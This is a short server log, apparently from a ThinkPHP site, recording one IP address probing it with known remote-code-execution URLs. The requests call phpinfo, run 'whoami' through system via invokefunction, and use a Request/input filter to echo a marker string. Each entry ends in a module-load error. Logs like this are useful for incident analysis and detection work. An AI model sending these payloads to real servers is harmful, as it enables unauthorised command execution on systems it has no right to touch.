[ 2024-03-03T04:40:04+08:00 ] 185.216.231.238 /index.php?s=index/think\app/invokefunction&function=phpinfo&vars[0]=-1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000502s ]
ERR: 无法加载模块:Index

[ 2024-03-03T06:48:48+08:00 ] 185.216.231.238 /?s=index%7Cthinkapp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B0%5D=whoami
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000560s ]
ERR: 无法加载模块:Index|thinkapp

[ 2024-03-03T08:58:54+08:00 ] 185.216.231.238 /?s=index%7Cthinkapp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B0%5D=whoami
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000502s ]
ERR: 无法加载模块:Index|thinkapp

[ 2024-03-03T11:55:01+08:00 ] 185.216.231.238 /?s=index/think/Request/input&filter=system&data=echo%20www_admin_com
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000049s ]
INFO: [ app_init ] --END-- [ RunTime:0.000893s ]
ERR: 无法加载模块:Index

[ 2024-03-03T14:07:45+08:00 ] 185.216.231.238 /?s=index/think/Request/input&filter=system&data=echo%20www_admin_com
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000563s ]
ERR: 无法加载模块:Index

